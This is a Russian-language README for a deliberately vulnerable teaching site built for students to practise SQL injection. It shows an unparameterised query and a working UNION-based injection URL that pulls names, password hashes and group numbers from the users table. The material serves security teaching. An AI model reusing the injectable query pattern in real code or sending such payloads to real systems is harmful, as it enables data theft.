# Тестовая площадка для изучения студентами SQL инъекций v2

Намеренно сделана с нарушениями всех возможных паттернов программирования, т.к., как ясно из названия, она должна легко взламываться студентами на курсе по инфобезу. Взломать эту штуку можно, вставив инъекцию на место имени пользователя при просмотре чужого профиля, т.к. страница пользователя работает так же, как список всех пользователей — в цикле выводит все результаты запроса из БД, с той лишь разницей, что запрос фильтруется по никнейму пользователя, переданному в адресной строке.

Запрос к БД на сервере:

```sql
SELECT nickname, status FROM users WHERE nickname = '{nickname}'
```

Инъекция в URL адресе:

http://{hostname}/users/' OR 1=1 UNION SELECT nickname, name from users UNION SELECT nickname, surname from users UNION SELECT nickname, pwd_hash from users UNION SELECT nickname, group_num from users--

Так выглядит запрос с SQL инъекцией:

```sql
SELECT nickname, status FROM users WHERE nickname = '' OR 1=1 UNION SELECT nickname, name from users UNION SELECT nickname, surname from users UNION SELECT nickname, pwd_hash from users UNION SELECT nickname, group_num from users--'
```


## Как запустить?

```bash
python -m venv venv
source venv/bin/activate
pip install -r requirements.txt
uvicorn app.main:app --host 0.0.0.0 --port 8000
```
